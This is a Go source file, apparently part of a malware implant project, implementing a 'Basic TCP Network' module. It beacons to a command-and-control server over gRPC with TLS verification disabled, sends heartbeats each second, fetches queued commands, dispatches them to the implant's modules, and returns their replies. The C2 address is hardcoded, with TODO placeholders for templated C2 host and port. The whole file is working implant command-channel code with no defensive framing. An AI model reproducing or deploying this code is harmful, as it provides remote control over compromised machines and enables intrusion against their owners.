package basic_tcp_network

import (
	"context"
	"crypto/tls"
	"fmt"
	"google.golang.org/grpc"
	"google.golang.org/grpc/connectivity"
	"google.golang.org/grpc/credentials"
	"log"
	"malware/common/messages"
	pb "malware/common/messages"
	"malware/common/types"
	"malware/implant/included_modules"
	"time"
)

type state struct {
	running bool
	conn    *grpc.ClientConn
	grpc    *grpc.Server
}

type settings struct {
	state *state
	host  string
}

func (settings settings) doConnection() {
	client := pb.NewMalwareClient(settings.state.conn)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	heartbeat := &pb.CheckCmdRequest_Heartbeat{Heartbeat: time.Now().Unix()}
	fmt.Println("Sending heartbeat")
	reply, err := client.CheckCommandQueue(ctx, &pb.CheckCmdRequest{Message: heartbeat})

	if err != nil {
		fmt.Println("Sending heartbeat help broken", err)
		return
	}

	fmt.Println(reply)
	for _, module := range included_modules.Modules {
		module.HandleMessage(reply, func(reply *messages.ImplantReply) {
			client := pb.NewMalwareClient(settings.state.conn)
			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
			defer cancel()

			client.CheckCommandQueue(ctx, &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}})
		})
	}

}

func (settings settings) fixConnection() {
	if settings.state.conn == nil || settings.state.conn.GetState() == connectivity.TransientFailure {
		if settings.state.conn != nil {
			settings.state.conn.Close()
		}

		var clientTLSConfig = &tls.Config{
			InsecureSkipVerify: true,
		}

		conn, err := grpc.Dial(settings.host, grpc.WithTransportCredentials(credentials.NewTLS(clientTLSConfig)))
		if err != nil {
			log.Fatalf("fail to dial: %v", err)
		}
		settings.state.conn = conn
	}
}

func (settings settings) listenServer() {
	for settings.state.running {
		settings.fixConnection()
		settings.doConnection()

		time.Sleep(1 * time.Second)
	}
	settings.state.conn.Close()
}

func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.ImplantReply)) {
	// Empty stub
}

func Create() types.Module {
	// TODO: Replace with %C2_PORT%
	// TODO: Replace with %C2_HOST%
	port := int16(8000)
	ip := "192.168.0.109"
	state := state{}
	host := fmt.Sprintf("%s:%d", ip, port)

	return settings{&state, host}
}

func (settings settings) Init() {
	settings.state.running = true

	settings.listenServer()
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "Basic TCP Network" }
